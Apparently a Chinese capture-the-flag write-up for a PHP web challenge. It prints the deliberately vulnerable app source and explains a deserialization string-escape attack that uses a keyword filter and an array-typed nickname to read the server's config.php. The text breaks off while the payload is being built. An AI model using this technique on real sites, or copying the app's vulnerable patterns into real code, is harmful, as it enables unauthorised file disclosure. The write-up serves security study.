class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $table = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">$password = <span class="built_in">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$key_list = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">$password = <span class="built_in">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">$object = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">$object = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $link = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params">$config</span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">$config[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">$config[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">$config[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">);</span><br><span class="line">mysql_select_db($config[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">$table, $where, $ret = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">$sql = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">$table, $key_list, $value_list</span>) </span>&#123;</span><br><span class="line">$key = implode(<span class="string">&#x27;,&#x27;</span>, $key_list);</span><br><span class="line">$value = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, $value_list) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">$sql = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$table, $key, $value, $where</span>) </span>&#123;</span><br><span class="line">$sql = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>class.php中的限制：</strong></p><p>1.update_profile 中对 new_profile 用 filter 进行了过滤；filter的功能是通过正则匹配把字符串中存在的<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>替换成<code>&#39;hacker&#39;</code></p><p><strong>config.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到在config.php中有变量flag，但为空，flag应该在服务器的config.php文件中，可以利用的漏洞读取服务器的flag</p><p><strong>register.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!$user-&gt;is_exists($username)) &#123;</span><br><span class="line">$user-&gt;register($username, $password);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;register.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Register&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;REGISTER&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个就是注册页面对应的源码，没什么特别的</p><p><strong>update.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; $_FILES[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是更新profile的源码。限制：</p><p>1.电话号码的长度应为11；</p><p>2.nickname长度小于 10 位，且只能为字母和数字；（注意此处的<code>^</code>，这个正则的意思是匹配除了a-zA-Z0-9_之外的字符,因为 <code>^</code> 符号是在 <code>[]</code>里面，所以是非的意思，不是开始的意思。）</p><p>3.对上传的信息进行了序列化。</p><p>看到这里的时候我还以为会不会是文件上传漏洞，上传一句话木马，但是发现他没有告诉我们文件上传地址，因此无法进一步操作，那就接着往下看吧</p><p><strong>profile.php</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="literal">null</span>) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Hi <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nickname;<span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $phone;<span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">&lt;label&gt;Email: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $email;<span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先判断参数profile的值是否为空，不为空则反序列化profile，然后把对应值回显到网页上</p><p><strong>我们先在来梳理一下思路：</strong></p><p>1.flag在config.php文件里，但是我们无法直接获取flag；</p><p>2.update.php对上传的数据做序列化处理；</p><p>3.profile.php会把update的数据反序列化然后回显到网页上，并且参数photo会以base64的方式读取上传图片；</p><p>4.nickname长度小于 10 位，且只能为字母和数字。</p><p>据此我们会想能不能利用file_get_contents函数获取服务器端的config.php文件，这就涉及到了<strong>反序列化字符逃逸</strong>。</p><p><strong>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o:1:&#123;s:4:&quot;name&quot;;s:6:&quot;linbei&quot;;&#125;</span><br></pre></td></tr></table></figure><p>篡改name的值，在name的地方输入<code>name&quot;;s:5:&quot;linmu&quot;;&#125;</code>，则序列化后变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o:1:&#123;s:19:&quot;name&quot;;s:5:&quot;linmu&quot;;&#125;&quot;;s:6:&quot;linbei&quot;;&#125;</span><br></pre></td></tr></table></figure><p>我们看到第一个s的值原本是4的但是此时却是19，那么这样的字符串反序列化后<code>&quot;;s:6:&quot;linbei&quot;;&#125;</code>还是无法逃逸，也就是说<code>s:5:&quot;linmu&quot;</code>没有顶替其的位置，但是好在class.php文件中有filter，我们可以利用filter的功能把字符串中存在的<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>替换成<code>&#39;hacker&#39;</code>，其中符合替换后长度增加的只有<code>where</code>。</p><p>我们希望上传后数据序列化变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:11:&quot;11111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:38:&quot;abc&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:*:******;&#125;</span><br></pre></td></tr></table></figure><p>也就是把原本$photo对应序列化的值顶掉，换成我们希望的config.php，那么我们要让<code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>逃逸</p><p><code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>长度为34，当字符串中出现一个where时，替换后增加一个长度，当出现34个where时，那么字符串增加34个长度，此时读取量s不变，增加的长度就把<code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>顶出去了。</p><p>但是这时又面临一个问题：nickname的值有长度限制，由于strlen()函数无法判别数组，因此我们可以抓包更改nickname属性为数组</p><p>我们试着构造payload：</p><p>$phone =<code> 11111111111</code><br>$email = <code>11111@qq.com</code><br>$nickname[] = 